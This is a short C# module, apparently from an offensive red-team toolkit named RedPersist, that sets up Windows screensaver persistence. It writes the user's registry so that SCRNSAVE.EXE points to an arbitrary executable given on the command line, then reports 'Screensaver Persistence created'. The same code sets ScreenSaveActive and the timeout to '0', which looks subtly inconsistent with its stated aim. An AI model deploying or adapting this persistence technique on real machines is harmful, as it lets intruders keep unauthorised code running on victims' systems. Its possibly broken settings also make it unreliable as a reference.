using Microsoft.Win32;
using System;
namespace RedPersist.Persist
{
    
    public class ScreenSaver1
    {
        public static void Do(string[] args)
        { 
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop\");
            key.SetValue("ScreenSaveActive", "0");
            key.SetValue("ScreenSaveTimeOut", "0");
            key.SetValue("SCRNSAVE.EXE", args[1]);
            key.Close();
            Console.WriteLine("[*] Screensaver Persistence created");
            //reg query "HKCU\Control Panel\Desktop" /s

        }
    }
}
